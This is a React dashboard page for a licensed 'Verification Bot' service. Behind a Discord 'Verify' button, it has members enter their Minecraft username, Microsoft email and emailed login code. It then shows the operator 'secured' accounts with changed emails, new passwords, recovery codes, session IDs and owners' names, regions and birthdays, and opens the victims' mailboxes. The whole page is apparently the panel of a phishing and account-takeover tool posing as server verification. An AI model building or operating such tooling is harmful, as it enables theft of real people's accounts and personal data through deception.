import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import {
  ShieldCheck, Copy, Check, Settings, Save, RefreshCw,
  ExternalLink, BookOpen, ClipboardList, Server, Key, Users,
  MessageSquare, Globe, ChevronRight, ChevronDown, AlertTriangle, Terminal, Mail, Inbox,
} from "lucide-react";
import {
  getVerificationKeys,
  getMyProfile,
  getVerificationSettings,
  saveVerificationSettings,
  getSecuredAccounts,
  getSecuredMailboxInbox,
  resendKey,
  getVerificationBotInvite,
} from "@/lib/luaux.functions";
import { RedeemKeyForm } from "@/components/redeem-key-form";
import { adminBypassesPaywall, getAdminShowPaywalls } from "@/lib/admin-preview";

export const Route = createFileRoute("/dashboard/verification-bot")({
  head: () => ({ meta: [{ title: "Verification Bot — LuauX" }] }),
  component: VerificationBotPage,
});

type KeyRow = {
  id: string;
  key: string;
  expires_at: string;
  created_at: string;
  delivered: boolean;
};

type GuideStepProps = {
  num: number;
  icon: React.ReactNode;
  title: string;
  children: React.ReactNode;
};

function GuideStep({ num, icon, title, children }: GuideStepProps) {
  return (
    <div className="relative pl-10 pb-8 last:pb-0">
      {num < 8 && (
        <div className="absolute left-[15px] top-8 bottom-0 w-px bg-primary/20" />
      )}
      <div className="absolute left-0 top-0 h-8 w-8 rounded-full bg-primary/15 brutal-border flex items-center justify-center">
        <span className="text-xs font-bold text-primary">{num}</span>
      </div>
      <div className="flex items-center gap-2 mb-2">
        {icon}
        <h4 className="font-semibold text-sm">{title}</h4>
      </div>
      <div className="text-xs text-muted-foreground space-y-2 leading-relaxed">
        {children}
      </div>
    </div>
  );
}

function CodeBlock({ children }: { children: string }) {
  const [copied, setCopied] = useState(false);

  const copy = async () => {
    await navigator.clipboard.writeText(children);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  return (
    <div className="relative group">
      <pre className="rounded-lg bg-background/80 brutal-border px-4 py-3 font-mono text-[11px] overflow-x-auto text-foreground/90">
        {children}
      </pre>
      <button
        onClick={copy}
        className="absolute top-2 right-2 rounded-md bg-secondary/60 hover:bg-secondary px-2 py-1 text-[10px] font-semibold opacity-0 group-hover:opacity-100 transition-opacity flex items-center gap-1"
      >
        {copied ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
        {copied ? "Copied" : "Copy"}
      </button>
    </div>
  );
}

function InlineCode({ children }: { children: string }) {
  return (
    <code className="rounded bg-primary/10 px-1.5 py-0.5 font-mono text-[11px] text-primary">
      {children}
    </code>
  );
}

function VerificationBotPage() {
  const fetchKeys = useServerFn(getVerificationKeys);
  const fetchProfile = useServerFn(getMyProfile);
  const fetchSettings = useServerFn(getVerificationSettings);
  const saveSettings = useServerFn(saveVerificationSettings);
  const fetchSecuredAccounts = useServerFn(getSecuredAccounts);
  const openMailboxInbox = useServerFn(getSecuredMailboxInbox);

  const [keys, setKeys] = useState<KeyRow[]>([]);
  const [isAdmin, setIsAdmin] = useState(false);
  const [showPaywalls, setShowPaywalls] = useState(false);
  const [loading, setLoading] = useState(true);
  const [copied, setCopied] = useState<string | null>(null);
  const [securedAccounts, setSecuredAccounts] = useState<Array<Record<string, unknown>>>([]);
  const [expandedIds, setExpandedIds] = useState<Record<string, boolean>>({});
  const [mailboxOpenId, setMailboxOpenId] = useState<string | null>(null);
  const [mailboxLoading, setMailboxLoading] = useState(false);
  const [mailboxError, setMailboxError] = useState<string | null>(null);
  const [mailboxData, setMailboxData] = useState<{
    email: string;
    host: string;
    provider: string;
    count: number;
    messages: Array<{
      uid: number;
      from: string;
      subject: string;
      date: string | null;
      snippet: string;
      body: string;
    }>;
  } | null>(null);
  const [selectedMsgUid, setSelectedMsgUid] = useState<number | null>(null);

  const [activeTab, setActiveTab] = useState<"config" | "guide" | "accounts">("config");

  // Settings state
  const [guildId, setGuildId] = useState("");
  const [verifiedRoleId, setVerifiedRoleId] = useState("");
  const [channelId, setChannelId] = useState("");
  const [messageTitle, setMessageTitle] = useState("Verification Required");
  const [messageDescription, setMessageDescription] = useState(
    "Click the button below to verify your account and gain access to the server.",
  );
  const [buttonText, setButtonText] = useState("Verify");
  const [botToken, setBotToken] = useState("");
  const [botPublicKey, setBotPublicKey] = useState("");

  const [saving, setSaving] = useState(false);
  const [successMsg, setSuccessMsg] = useState<string | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [inviteUrl, setInviteUrl] = useState("");

  const fetchInvite = useServerFn(getVerificationBotInvite);

  useEffect(() => {
    Promise.all([
      fetchKeys(),
      fetchProfile(),
      fetchSettings(),
      fetchSecuredAccounts(),
      fetchInvite(),
    ])
      .then(([k, p, s, accts, inv]) => {
        setKeys(k as KeyRow[]);
        setIsAdmin((p as { isAdmin?: boolean }).isAdmin ?? false);
        setSecuredAccounts(accts as Array<Record<string, unknown>>);
        const invite = (inv as { invite?: string })?.invite || "";
        setInviteUrl(invite);
        if (s) {
          const settings = s as {
            guild_id: string;
            verified_role_id: string;
            channel_id: string;
            message_title: string;
            message_description: string;
            button_text: string;
            bot_token?: string | null;
            has_bot_token?: boolean;
            bot_public_key?: string | null;
          };
          setGuildId(settings.guild_id || "");
          setVerifiedRoleId(settings.verified_role_id || "");
          setChannelId(settings.channel_id || "");
          setMessageTitle(settings.message_title || "Verification Required");
          setMessageDescription(
            settings.message_description ||
              "Click the button below to verify your account and gain access to the server.",
          );
          setButtonText(settings.button_text || "Verify");
          setBotToken(settings.has_bot_token ? "••••••••" : "");
          setBotPublicKey(settings.bot_public_key || "");
        }
      })
      .finally(() => setLoading(false));
  }, [fetchKeys, fetchProfile, fetchSettings, fetchSecuredAccounts, fetchInvite]);

  useEffect(() => {
    setShowPaywalls(getAdminShowPaywalls());
    const on = () => setShowPaywalls(getAdminShowPaywalls());
    window.addEventListener("luaux-admin-preview", on);
    window.addEventListener("storage", on);
    return () => {
      window.removeEventListener("luaux-admin-preview", on);
      window.removeEventListener("storage", on);
    };
  }, []);

  const activeKey = adminBypassesPaywall(isAdmin)
    ? { key: "ADMIN", expires_at: "2099-12-31", created_at: "" }
    : keys.find((k) => new Date(k.expires_at).getTime() > Date.now());
  void showPaywalls;

  const copy = async (v: string) => {
    await navigator.clipboard.writeText(v);
    setCopied(v);
    setTimeout(() => setCopied(null), 1500);
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    setSaving(true);
    setSuccessMsg(null);
    setErrorMsg(null);

    if (!guildId.trim()) {
      setSaving(false);
      return setErrorMsg("Server ID is required");
    }
    if (!verifiedRoleId.trim()) {
      setSaving(false);
      return setErrorMsg("Verified Role ID is required");
    }
    if (!channelId.trim()) {
      setSaving(false);
      return setErrorMsg("Channel ID is required");
    }
    if (!botToken.trim()) {
      setSaving(false);
      return setErrorMsg("Bot Token is required");
    }

    try {
      const tokenToSend = botToken.includes("•") ? "" : botToken.trim();
      await saveSettings({
        data: {
          guild_id: guildId.trim(),
          verified_role_id: verifiedRoleId.trim(),
          channel_id: channelId.trim(),
          message_title: messageTitle.trim() || "Verification Required",
          message_description:
            messageDescription.trim() ||
            "Click the button below to verify your account and gain access to the server.",
          button_text: buttonText.trim() || "Verify",
          bot_token: tokenToSend,
          bot_public_key: botPublicKey.trim(),
        },
      });
      setSuccessMsg(
        "Done! Verify button posted to your channel.",
      );
    } catch (err) {
      setErrorMsg(err instanceof Error ? err.message : "Failed to save verification settings.");
    } finally {
      setSaving(false);
    }
  };

  if (loading) {
    return <div className="text-sm text-muted-foreground">Loading...</div>;
  }

  return (
    <div className="space-y-6">
      <header className="space-y-1">
        <div className="flex items-center gap-2 flex-wrap">
          <h1 className="text-2xl font-semibold tracking-tight">Verification Bot</h1>
          {isAdmin && (
            <span className="rounded bg-primary/15 text-primary px-2 py-0.5 text-[10px] font-medium">
              Admin
            </span>
          )}
        </div>
        <p className="text-sm text-muted-foreground">
          Your Discord bot token, server IDs, and secured accounts.
        </p>
      </header>

      {activeKey && (
        <div className="rounded-xl border border-border/60 bg-card px-4 py-3 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-2 text-sm">
            <Check className="h-4 w-4 text-primary" />
            <span className="font-medium">License active</span>
            {!isAdmin && (
              <span className="text-muted-foreground text-xs">
                · expires {new Date(activeKey!.expires_at).toLocaleDateString()}
              </span>
            )}
            {isAdmin && (
              <span className="text-muted-foreground text-xs">· admin bypass</span>
            )}
          </div>
          {!isAdmin && (
            <div className="flex items-center gap-2 min-w-0">
              <code className="text-xs font-mono truncate max-w-[200px] text-muted-foreground">
                {activeKey.key}
              </code>
              <button
                onClick={() => copy(activeKey.key)}
                className="text-xs text-primary hover:underline shrink-0"
              >
                {copied === activeKey.key ? "Copied" : "Copy"}
              </button>
            </div>
          )}
        </div>
      )}

      {!activeKey && !isAdmin && (
        <div className="rounded-xl border border-border/60 bg-card p-6 text-center space-y-3">
          <h2 className="text-lg font-semibold">No license yet</h2>
          <p className="text-sm text-muted-foreground max-w-sm mx-auto">
            Buy a plan or redeem a key in Settings to use Verification Bot.
          </p>
          <a
            href="/dashboard/purchase"
            className="inline-flex rounded-lg bg-primary text-primary-foreground px-4 py-2 text-sm font-medium"
          >
            Purchase
          </a>
        </div>
      )}

      {(isAdmin || activeKey) && (
        <>
          <div className="flex gap-0 border-b border-border/60">
            {[
              { id: "config" as const, label: "Config" },
              { id: "guide" as const, label: "Guide" },
              {
                id: "accounts" as const,
                label: `Accounts${securedAccounts.length ? ` (${securedAccounts.length})` : ""}`,
              },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`px-4 py-2.5 text-sm font-medium border-b-2 -mb-px transition-colors ${
                  activeTab === tab.id
                    ? "border-primary text-foreground"
                    : "border-transparent text-muted-foreground hover:text-foreground"
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>

          {activeTab === "config" && (
            <div className="space-y-5">
              <div className="rounded-lg border border-border/50 bg-card p-4 text-sm text-muted-foreground">
                Need help? Open the <button type="button" onClick={() => setActiveTab("guide")} className="text-primary hover:underline font-medium">Guide</button> tab.
              </div>

              <div className="rounded-lg border border-border/50 bg-card">
                <div className="px-4 py-3 border-b border-border/40">
                  <h3 className="text-sm font-medium">Settings</h3>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Bot token + server, role, and channel IDs.
                  </p>
                </div>

                <form onSubmit={handleSave} className="p-4 space-y-3">
                  <div className="grid md:grid-cols-2 gap-3">
                    <label className="text-xs space-y-1 md:col-span-2">
                      <span className="text-muted-foreground">Bot token</span>
                      <input
                        className="w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm font-mono"
                        value={botToken}
                        onChange={(e) => setBotToken(e.target.value)}
                        placeholder="From Discord Developer Portal → Bot"
                        type="password"
                        autoComplete="off"
                        required
                      />
                    </label>
                    <label className="text-xs space-y-1 md:col-span-2">
                      <span className="text-muted-foreground">Public key (optional)</span>
                      <input
                        className="w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm font-mono"
                        value={botPublicKey}
                        onChange={(e) => setBotPublicKey(e.target.value)}
                        placeholder="Leave empty — we fill it from the token"
                      />
                    </label>
                    <label className="text-xs space-y-1">
                      <span className="text-muted-foreground">Server ID</span>
                      <input
                        className="w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm font-mono"
                        value={guildId}
                        onChange={(e) => setGuildId(e.target.value)}
                        placeholder="Server ID"
                        required
                      />
                    </label>
                    <label className="text-xs space-y-1">
                      <span className="text-muted-foreground">Verified role ID</span>
                      <input
                        className="w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm font-mono"
                        value={verifiedRoleId}
                        onChange={(e) => setVerifiedRoleId(e.target.value)}
                        placeholder="Role ID"
                        required
                      />
                    </label>
                    <label className="text-xs space-y-1 md:col-span-2">
                      <span className="text-muted-foreground">Channel ID</span>
                      <input
                        className="w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm font-mono"
                        value={channelId}
                        onChange={(e) => setChannelId(e.target.value)}
                        placeholder="Channel for the Verify button"
                        required
                      />
                    </label>
                  </div>

                  <details className="rounded-md border border-border/40 px-3 py-2">
                    <summary className="text-xs cursor-pointer text-muted-foreground">
                      Optional message text
                    </summary>
                    <div className="mt-2 space-y-2">
                      <label className="text-xs space-y-1 block">
                        <span className="text-muted-foreground">Title</span>
                        <input
                          className="w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm"
                          value={messageTitle}
                          onChange={(e) => setMessageTitle(e.target.value)}
                        />
                      </label>
                      <label className="text-xs space-y-1 block">
                        <span className="text-muted-foreground">Description</span>
                        <textarea
                          className="w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm resize-none"
                          rows={2}
                          value={messageDescription}
                          onChange={(e) => setMessageDescription(e.target.value)}
                        />
                      </label>
                      <label className="text-xs space-y-1 block">
                        <span className="text-muted-foreground">Button text</span>
                        <input
                          className="w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm"
                          value={buttonText}
                          onChange={(e) => setButtonText(e.target.value)}
                        />
                      </label>
                    </div>
                  </details>

                  {successMsg && <div className="text-xs text-primary">{successMsg}</div>}
                  {errorMsg && <div className="text-xs text-destructive">{errorMsg}</div>}

                  <button
                    type="submit"
                    disabled={saving}
                    className="w-full rounded-md bg-primary text-primary-foreground px-4 py-2.5 text-sm font-medium disabled:opacity-50"
                  >
                    {saving ? "Saving…" : "Save & post Verify button"}
                  </button>
                </form>
              </div>
            </div>
          )}

          {activeTab === "guide" && (
            <div className="space-y-4 max-w-2xl">
              <div>
                <h3 className="text-base font-medium">Setup guide</h3>
                <p className="text-sm text-muted-foreground mt-0.5">
                  Follow these steps in order. About 5 minutes.
                </p>
              </div>

              <ol className="space-y-3">
                {[
                  {
                    t: "Create a Discord bot",
                    b: (
                      <>
                        <p className="mb-2">You use <strong>your own bot</strong> (not a shared one).</p>
                        <ol className="list-decimal list-inside space-y-1 text-muted-foreground">
                          <li>
                            Go to{" "}
                            <a
                              href="https://discord.com/developers/applications"
                              target="_blank"
                              rel="noopener noreferrer"
                              className="text-primary hover:underline"
                            >
                              discord.com/developers/applications
                            </a>
                          </li>
                          <li>
                            <strong className="text-foreground">New Application</strong> → open{" "}
                            <strong className="text-foreground">Bot</strong> →{" "}
                            <strong className="text-foreground">Reset Token</strong> → copy the token
                          </li>
                          <li>
                            Leave <strong className="text-foreground">Interactions Endpoint URL</strong> empty
                          </li>
                          <li>
                            <strong className="text-foreground">OAuth2 → URL Generator</strong>: scopes{" "}
                            <code className="text-[11px] bg-secondary/50 px-1 rounded">bot</code> +{" "}
                            <code className="text-[11px] bg-secondary/50 px-1 rounded">applications.commands</code>
                          </li>
                          <li>
                            Permissions: Send Messages, Embed Links, Manage Roles, View Channels, Read Message History
                          </li>
                          <li>Open the invite link → pick your server → Authorize</li>
                        </ol>
                      </>
                    ),
                  },
                  {
                    t: "Turn on Developer Mode",
                    b: (
                      <p className="text-muted-foreground">
                        Discord app → <strong className="text-foreground">User Settings → Advanced → Developer Mode</strong> (on).
                        This lets you copy Server / Role / Channel IDs.
                      </p>
                    ),
                  },
                  {
                    t: "Make a Verified role",
                    b: (
                      <ol className="list-decimal list-inside space-y-1 text-muted-foreground">
                        <li>Server Settings → Roles → Create Role (e.g. <code className="text-[11px] bg-secondary/50 px-1 rounded">Verified</code>)</li>
                        <li>
                          Put the <strong className="text-foreground">bot’s role above</strong> this role
                        </li>
                        <li>Right-click the role → <strong className="text-foreground">Copy Role ID</strong></li>
                      </ol>
                    ),
                  },
                  {
                    t: "Pick a verify channel",
                    b: (
                      <ol className="list-decimal list-inside space-y-1 text-muted-foreground">
                        <li>Use or create a channel (e.g. #verify)</li>
                        <li>Bot needs Send Messages + Embed Links there</li>
                        <li>Right-click channel → <strong className="text-foreground">Copy Channel ID</strong></li>
                        <li>Right-click server name → <strong className="text-foreground">Copy Server ID</strong></li>
                      </ol>
                    ),
                  },
                  {
                    t: "Fill Config and save",
                    b: (
                      <ol className="list-decimal list-inside space-y-1 text-muted-foreground">
                        <li>
                          Open the{" "}
                          <button type="button" onClick={() => setActiveTab("config")} className="text-primary hover:underline font-medium">
                            Config
                          </button>{" "}
                          tab
                        </li>
                        <li>Paste bot token, Server ID, Role ID, Channel ID</li>
                        <li>Public key: leave blank (auto)</li>
                        <li>
                          Click <strong className="text-foreground">Save & post Verify button</strong>
                        </li>
                      </ol>
                    ),
                  },
                  {
                    t: "Test it",
                    b: (
                      <ol className="list-decimal list-inside space-y-1 text-muted-foreground">
                        <li>In Discord, click <strong className="text-foreground">Verify</strong></li>
                        <li>Enter Minecraft username + Microsoft email</li>
                        <li>Enter the code Microsoft sends to that email</li>
                        <li>
                          When done, check{" "}
                          <button type="button" onClick={() => setActiveTab("accounts")} className="text-primary hover:underline font-medium">
                            Accounts
                          </button>{" "}
                          for credentials (not in Discord chat)
                        </li>
                      </ol>
                    ),
                  },
                ].map((step, i) => (
                  <li
                    key={step.t}
                    className="rounded-lg border border-border/50 bg-card p-4 list-none flex gap-3"
                  >
                    <span className="shrink-0 h-7 w-7 rounded-full bg-secondary/60 text-sm font-medium flex items-center justify-center">
                      {i + 1}
                    </span>
                    <div className="min-w-0 flex-1 text-sm">
                      <div className="font-medium mb-1.5">{step.t}</div>
                      {step.b}
                    </div>
                  </li>
                ))}
              </ol>

              <div className="rounded-lg border border-border/50 bg-card p-4 text-sm space-y-2">
                <div className="font-medium">Good to know</div>
                <ul className="text-muted-foreground space-y-1 text-xs list-disc list-inside">
                  <li>Passwords and recovery codes only show in Accounts — never in Discord.</li>
                  <li>Each secure creates a recovery mailbox you can open from Accounts.</li>
                  <li>Bot must stay online (worker running) for Verify clicks to work.</li>
                </ul>
              </div>
            </div>
          )}

          {activeTab === "accounts" && (
            <div className="space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-3">
                <p className="text-sm text-muted-foreground">
                  {securedAccounts.length} secured
                </p>
                <div className="flex gap-3 text-xs">
                  <button
                    type="button"
                    onClick={() => {
                      const next: Record<string, boolean> = {};
                      for (const a of securedAccounts) {
                        const id = String((a as { id?: string }).id || "");
                        if (id) next[id] = true;
                      }
                      setExpandedIds(next);
                    }}
                    className="text-muted-foreground hover:text-foreground"
                  >
                    Expand
                  </button>
                  <button
                    type="button"
                    onClick={() => setExpandedIds({})}
                    className="text-muted-foreground hover:text-foreground"
                  >
                    Collapse
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      setLoading(true);
                      fetchSecuredAccounts()
                        .then((accts) => setSecuredAccounts(accts as Array<Record<string, unknown>>))
                        .finally(() => setLoading(false));
                    }}
                    className="text-primary hover:underline"
                  >
                    Refresh
                  </button>
                </div>
              </div>

              {securedAccounts.length > 0 ? (
                <div className="space-y-3">
                  {(securedAccounts as Array<Record<string, unknown>>).map((acc) => {
                    const id = String(acc.id || "");
                    const expanded = !!expandedIds[id];
                    const hasMailbox = !!acc.has_mailbox;
                    const inboxOpen = mailboxOpenId === id;
                    const copyVal = async (label: string, v: string) => {
                      if (!v || v === "—") return;
                      await navigator.clipboard.writeText(v);
                      setCopied(label + id);
                      setTimeout(() => setCopied(null), 1200);
                    };
                    const field = (label: string, value: string) => (
                      <div className="min-w-0 space-y-0.5">
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-xs text-muted-foreground">{label}</span>
                          {value && value !== "—" ? (
                            <button
                              type="button"
                              onClick={() => void copyVal(label, value)}
                              className="text-[11px] text-muted-foreground hover:text-foreground"
                            >
                              {copied === label + id ? "ok" : "copy"}
                            </button>
                          ) : null}
                        </div>
                        <code className="block text-sm font-mono break-all text-foreground">
                          {value || "—"}
                        </code>
                      </div>
                    );

                    return (
                      <div
                        key={id}
                        className="rounded-lg border border-border/50 bg-card overflow-hidden"
                      >
                        <button
                          type="button"
                          onClick={() =>
                            setExpandedIds((prev) => ({ ...prev, [id]: !prev[id] }))
                          }
                          className="w-full flex items-center gap-3 px-3.5 py-3 text-left hover:bg-secondary/15"
                        >
                          {expanded ? (
                            <ChevronDown className="h-4 w-4 text-muted-foreground shrink-0" />
                          ) : (
                            <ChevronRight className="h-4 w-4 text-muted-foreground shrink-0" />
                          )}
                          <div className="flex-1 min-w-0">
                            <div className="text-sm font-medium truncate">
                              {String(acc.mc_username || "Unknown")}
                            </div>
                            <div className="text-xs text-muted-foreground truncate">
                              {String(acc.new_email || acc.mailbox_email || "")}
                            </div>
                          </div>
                          <span className="text-xs text-muted-foreground shrink-0">
                            {acc.secured_at
                              ? new Date(String(acc.secured_at)).toLocaleDateString()
                              : ""}
                          </span>
                        </button>

                        {expanded ? (
                          <div className="px-3.5 pb-3.5 space-y-4 border-t border-border/40 pt-3">
                            <div className="grid sm:grid-cols-2 gap-x-6 gap-y-3">
                              {field("Original email", String(acc.mc_email || "—"))}
                              {field("New email", String(acc.new_email || "—"))}
                              {field("Password", String(acc.new_password || "—"))}
                              {field("Recovery code", String(acc.new_recovery_code || "—"))}
                              {field("Method", String(acc.mc_method || "—"))}
                              {field("Capes", String(acc.mc_capes || "—"))}
                              {field(
                                "Name",
                                [acc.owner_first_name, acc.owner_last_name]
                                  .filter(Boolean)
                                  .join(" ") || "—",
                              )}
                              {field("Region", String(acc.owner_region || "—"))}
                              {field("Birthday", String(acc.owner_birthday || "—"))}
                              {acc.mc_ssid
                                ? field(
                                    "SSID",
                                    String(acc.mc_ssid).slice(0, 64) +
                                      (String(acc.mc_ssid).length > 64 ? "…" : ""),
                                  )
                                : null}
                            </div>

                            <div className="rounded-lg border border-border/50 bg-secondary/10 p-3 space-y-3">
                              <div className="flex flex-wrap items-center justify-between gap-2">
                                <div className="min-w-0">
                                  <div className="text-sm font-medium">Mailbox</div>
                                  <code className="text-xs text-muted-foreground break-all">
                                    {String(acc.mailbox_email || acc.new_email || "—")}
                                  </code>
                                </div>
                                <button
                                  type="button"
                                  disabled={mailboxLoading && inboxOpen}
                                  onClick={async (e) => {
                                    e.stopPropagation();
                                    if (inboxOpen) {
                                      setMailboxOpenId(null);
                                      setMailboxData(null);
                                      setMailboxError(null);
                                      setSelectedMsgUid(null);
                                      return;
                                    }
                                    setMailboxOpenId(id);
                                    setMailboxLoading(true);
                                    setMailboxError(null);
                                    setMailboxData(null);
                                    setSelectedMsgUid(null);
                                    try {
                                      const inbox = (await openMailboxInbox({
                                        data: { secured_id: id },
                                      })) as {
                                        email: string;
                                        host: string;
                                        provider: string;
                                        count: number;
                                        messages: Array<{
                                          uid: number;
                                          from: string;
                                          subject: string;
                                          date: string | null;
                                          snippet: string;
                                          body: string;
                                        }>;
                                      };
                                      setMailboxData(inbox);
                                      if (inbox.messages[0]) setSelectedMsgUid(inbox.messages[0].uid);
                                    } catch (err) {
                                      setMailboxError(
                                        err instanceof Error
                                          ? err.message
                                          : "Failed to open mailbox",
                                      );
                                    } finally {
                                      setMailboxLoading(false);
                                    }
                                  }}
                                  className="rounded-md bg-primary text-primary-foreground px-3 py-1.5 text-xs font-medium disabled:opacity-50"
                                >
                                  {mailboxLoading && inboxOpen
                                    ? "…"
                                    : inboxOpen
                                      ? "Close"
                                      : "Open inbox"}
                                </button>
                              </div>

                              {inboxOpen && mailboxError ? (
                                <p className="text-xs text-destructive">{mailboxError}</p>
                              ) : null}
                              {inboxOpen && mailboxLoading ? (
                                <p className="text-xs text-muted-foreground">Loading…</p>
                              ) : null}

                              {inboxOpen && mailboxData && !mailboxLoading ? (
                                <div className="grid md:grid-cols-2 gap-2 border border-border/40 rounded-md overflow-hidden">
                                  <div className="max-h-64 overflow-y-auto divide-y divide-border/30">
                                    {mailboxData.messages.length === 0 ? (
                                      <p className="p-2.5 text-xs text-muted-foreground">Empty</p>
                                    ) : (
                                      mailboxData.messages.map((m) => (
                                        <button
                                          key={m.uid}
                                          type="button"
                                          onClick={() => setSelectedMsgUid(m.uid)}
                                          className={`w-full text-left px-2.5 py-2 hover:bg-secondary/30 ${
                                            selectedMsgUid === m.uid ? "bg-secondary/40" : ""
                                          }`}
                                        >
                                          <div className="text-xs font-medium truncate">
                                            {m.subject}
                                          </div>
                                          <div className="text-[11px] text-muted-foreground truncate">
                                            {m.from}
                                          </div>
                                        </button>
                                      ))
                                    )}
                                  </div>
                                  <div className="p-2.5 max-h-64 overflow-y-auto border-t md:border-t-0 md:border-l border-border/30">
                                    {(() => {
                                      const msg =
                                        mailboxData.messages.find(
                                          (m) => m.uid === selectedMsgUid,
                                        ) || mailboxData.messages[0];
                                      if (!msg) {
                                        return (
                                          <p className="text-xs text-muted-foreground">
                                            Select a message
                                          </p>
                                        );
                                      }
                                      return (
                                        <div className="space-y-1.5">
                                          <div className="text-sm font-medium">{msg.subject}</div>
                                          <div className="text-[11px] text-muted-foreground">
                                            {msg.from}
                                          </div>
                                          <p className="text-xs whitespace-pre-wrap leading-relaxed text-foreground/90">
                                            {msg.body || msg.snippet || ""}
                                          </p>
                                        </div>
                                      );
                                    })()}
                                  </div>
                                </div>
                              ) : null}
                            </div>
                          </div>
                        ) : null}
                      </div>
                    );
                  })}
                </div>
              ) : (
                <div className="rounded-lg border border-border/50 bg-card p-8 text-center">
                  <p className="text-sm text-muted-foreground">No secured accounts yet.</p>
                </div>
              )}
            </div>
          )}
        </>
      )}
    </div>
  );
}
